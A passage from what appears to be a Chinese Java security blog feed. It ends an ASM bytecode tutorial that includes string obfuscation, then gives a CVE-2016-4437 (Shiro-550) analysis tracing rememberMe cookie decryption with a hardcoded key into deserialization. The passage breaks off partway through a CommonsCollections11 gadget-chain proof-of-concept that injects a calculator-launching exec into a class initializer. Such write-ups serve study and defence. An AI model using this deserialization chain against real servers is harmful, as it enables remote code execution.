jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;asm&quot;&gt;&lt;a href=&quot;#asm&quot; class=&quot;headerlink&quot; title=&quot;asm&quot;&gt;&lt;/a&gt;asm&lt;/h1&gt;&lt;h2 id=&quot;分析类&quot;&gt;&lt;a href=&quot;#分析类&quot; class=&quot;headerlink&quot; title=&quot;分析类&quot;&gt;&lt;/a&gt;分析类&lt;/h</summary>
      
    
    
    
    <category term="java security" scheme="http://example.com/categories/java-security/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437漏洞分析</title>
    <link href="http://example.com/2022/11/10/CVE-2016-4437/"/>
    <id>http://example.com/2022/11/10/CVE-2016-4437/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:56:50.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2016-4437漏洞分析"><a href="#CVE-2016-4437漏洞分析" class="headerlink" title="CVE-2016-4437漏洞分析"></a>CVE-2016-4437漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。</p><p>影响版本：Shiro  &lt; 1.2.5</p><p>漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。</p><h3 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h3><p><code>org.apache.shiro.mgt.RememberMeManager</code>接口提供了以下五个方法：</p><ul><li><code>getRememberedPrincipals()</code>：RememberMe 的功能，在指定上下文中寻找记录的<code>principals</code>。</li><li><code>forgetIdentity()</code>：忘记用户身份标识。</li><li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li><li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li><li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li></ul><h3 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h3><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey/decryptionCipherKey）。</li><li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li><li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li></ul><h3 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h3><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类在 Shiro 中实现使用 Cookie 记录用户身份信息的功能，比较值得关注的方法为<code>getRememberedSerializedIdentity()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="built_in">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞环境已经上传到 github 中：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a></p><p>先简单了解一下该漏洞的原理：</p><p>当用户登录勾选<code>remember me</code>的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。<br><img src="images/image-20221018155429239.png" alt="image-20221018155429239"></p><p>然而通过前面的<code>AbstractRememberMeManager</code>类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。</p><p>那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。</p><p>在<code>#getRememberedPrincipals()</code>方法中将上下文数据传入到<code>getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018111741540.png" alt="image-20221018111741540"></p><p>接着会跳转到<code>CookieRememberMeManager#getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018155851444.png" alt="image-20221018155851444"></p><p>可以看到<code>readValue()</code>方法会从请求中获取<code>RememberMe</code>字段的值，最后通过<code>Base64.decode()</code>解码后返回 byte 数组，接着又回到<code>getRememberedPrincipals()</code>方法<br><img src="images/image-20221018160049461.png" alt="image-20221018160049461"></p><p>继续跟进<code>convertBytesToPrincipals()</code>方法，调用<code>decrypt()</code>方法进行解密<br><img src="images/image-20221018160159474.png" alt="image-20221018160159474"></p><p>继续跟进<code>decrypt()</code>方法<br><img src="images/image-20221018160308176.png" alt="image-20221018160308176"></p><p>这里调用到<code>getDecryptionCipherKey()</code>方法，我们跟进一下<br><img src="images/image-20221018162044495.png" alt="image-20221018162044495"></p><p>这里到了<code>AbstractRememberMeManager#getDecryptionCipherKey()</code>方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。</p><p>接着<code>decrypt()</code>方法走完 return 了<code>serialized</code>字节数组，最后调用了<code>deserialize()</code>方法<br><img src="images/image-20221018162427231.png" alt="image-20221018162427231"></p><p>继续跟进<code>deserialize()</code>方法，跟着调用了<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162530315.png" alt="image-20221018162530315"></p><p>继续跟进<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162715157.png" alt="image-20221018162715157"></p><p>可以看到，这里通过<code>ByteArrayInputStream()</code>获取了输入流，最后调用<code>readObject()</code>方法进行反序列化。</p><p>回顾梳理一下流程：</p><ol><li>传入<code>RememberMe</code>字段，获取该字段的值；</li><li>对<code>RememberMe</code>进行 Base64 解码，然后调用硬编码的 KEY 进行解密；</li><li>对解密后的内容进行反序列化。</li></ol><h2 id="编写-POC"><a href="#编写-POC" class="headerlink" title="编写 POC"></a>编写 POC</h2><p>在 pom.xml 文件里添加了<code>CommonCollections</code>和<code>javassist</code>依赖，以完成反序列化的利用演示。<br><img src="images/image-20221018163306620.png" alt="image-20221018163306620"></p><p>这里通过前面我们学习的<code>CommonsCollections11</code>链子生成恶意文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> 